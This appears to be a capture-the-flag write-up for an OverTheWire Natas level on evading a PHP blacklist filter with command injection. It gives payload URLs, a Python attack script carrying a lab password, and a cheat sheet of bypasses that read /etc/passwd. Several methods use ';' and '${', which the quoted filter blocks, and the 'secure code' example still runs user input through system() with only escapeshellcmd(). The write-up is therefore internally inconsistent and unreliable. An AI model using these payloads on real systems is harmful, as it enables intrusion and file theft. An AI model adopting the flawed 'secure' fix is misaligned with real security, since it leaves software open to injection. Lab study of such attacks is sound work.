// Key Concepts

// Challenge Overview

This level has a more advanced filter that blocks many common command injection characters. We need to bypass the filter using techniques like Base64 encoding, command substitution, or alternative command execution methods.

// Initial Analysis

View the source code:

<?php $cmd = $_GET["cmd"]; $filter = "/(;|&|\||`|\\$\(|\\$\{|system|exec|passthru|shell_exec)/i"; if (preg_match($filter, $cmd)) { die("Invalid command"); } system($cmd); ?>

The filter blocks several characters and function names. We need to find a way around it.

💡 Blacklist filters are always incomplete. Attackers can use encoding, command substitution, or alternative command execution methods to bypass them.

// Solution Walkthrough

Method 1 — Using Base64 encoding:

We can encode the command in Base64 and decode it inside the command:

http://natas29.natas.labs.overthewire.org/?cmd=echo 'cat /etc/natas_webpass/natas30' | base64 -d | sh

Method 2 — Using $IFS (Internal Field Separator):

http://natas29.natas.labs.overthewire.org/?cmd=cat$IFS/etc/natas_webpass/natas30

Method 3 — Using wildcards:

http://natas29.natas.labs.overthewire.org/?cmd=/bin/cat /etc/natas_webpass/natas*

Method 4 — Using single quotes to bypass filters:

http://natas29.natas.labs.overthewire.org/?cmd=c''at /etc/natas_webpass/natas30

Method 5 — Using environment variables:

http://natas29.natas.labs.overthewire.org/?cmd=${PATH:0:1}at /etc/natas_webpass/natas30

Method 6 — Using shell variables:

http://natas29.natas.labs.overthewire.org/?cmd=a=cat;b=/etc/natas_webpass/natas30;$a $b

Using Python to try various bypasses:

import requests import base64 url = "http://natas29.natas.labs.overthewire.org/" auth = ("natas29", "Mp3J3ZnT8G7FJw6oBC34AdwBvIY2DZ0g") # Try Base64 encoding cmd = "cat /etc/natas_webpass/natas30" encoded = base64.b64encode(cmd.encode()).decode() payload = f"echo '{encoded}' | base64 -d | sh" params = {"cmd": payload} response = requests.get(url, auth=auth, params=params) print(response.text) # Try using ${IFS} payload = "cat${IFS}/etc/natas_webpass/natas30" params = {"cmd": payload} response = requests.get(url, auth=auth, params=params) print(response.text) # Try command substitution with variables payload = "a=cat;b=/etc/natas_webpass/natas30;$a $b" params = {"cmd": payload} response = requests.get(url, auth=auth, params=params) print(response.text)

// Why It Works

The command injection with filter bypass works because:

  • Blacklist is incomplete: It doesn't block all possible injection vectors.
  • Base64 encoding: The command is encoded to avoid the filter.
  • IFS variable: $IFS is not blocked and can replace spaces.
  • Wildcards: * is not blocked and can match filenames.
  • String concatenation: Using quotes to split the command name.

// Common Command Injection Bypasses

# Space bypasses cat$IFS/etc/passwd cat${IFS}/etc/passwd cat%20/etc/passwd cat%09/etc/passwd # Command name bypasses c''at /etc/passwd c${:}at /etc/passwd ${PATH:0:1}at /etc/passwd # Encoding echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh # Wildcards /usr/bin/cat /etc/pass*

// Defensive Measures

  • Avoid using system commands with user input entirely.
  • Use a whitelist of allowed commands and characters.
  • Use escapeshellarg() and escapeshellcmd().
  • Use native PHP functions instead of shell commands.
  • Implement input validation with a positive security model.

// Secure Code Example

<?php // Method 1: Whitelist allowed commands $allowed_commands = ['whoami', 'date', 'pwd']; $cmd = in_array($_GET['cmd'], $allowed_commands) ? $_GET['cmd'] : 'date'; // Method 2: Use escapeshellcmd $cmd = escapeshellcmd($_GET['cmd']); system($cmd); // Method 3: Use native PHP functions if ($_GET['cmd'] == 'whoami') { echo get_current_user(); } ?>

// Key Takeaways

🚫 Blacklists Are Incomplete

Attackers always find ways to bypass blacklist filters. Use whitelists instead of blacklists.

🛡️ Avoid System Commands

The safest approach is to avoid using system commands with user input entirely. Use native functions instead.
